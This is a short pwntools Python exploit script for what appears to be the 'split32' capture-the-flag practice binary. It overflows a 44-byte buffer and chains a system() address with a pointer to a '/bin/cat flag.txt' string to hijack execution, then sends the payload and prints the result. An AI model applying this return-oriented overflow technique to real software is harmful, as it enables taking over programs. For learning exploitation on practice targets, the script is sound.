from pwn import *

context.arch = 'i386'
prog = process("./split32")

payload = b'a' * 44
# system()
payload += p32(0x0804861a)
# /bin/cat flag.txt string
payload += p32(0x0804a030)
print(payload)

with open("./payload.txt", "wb+") as f:
    f.write(payload)

output = prog.recvuntil(">")
print(output.decode("utf-8"))

prog.clean()

prog.sendline(payload)

output = prog.recvall()
print(output.decode("utf-8"))
